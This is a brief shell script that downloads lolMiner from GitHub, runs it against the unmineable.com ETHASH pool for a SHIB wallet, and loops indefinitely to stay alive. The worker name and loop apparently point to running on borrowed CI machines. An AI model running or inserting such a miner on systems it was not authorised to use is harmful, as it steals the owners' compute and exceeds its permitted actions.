#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29
./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x0472bf348bf347457a741f43db3f62bb67529d5c.Git1#fhlm-b8to --ethstratum ETHPROXY
while [ 1 ]; do
sleep 3
done
sleep 999
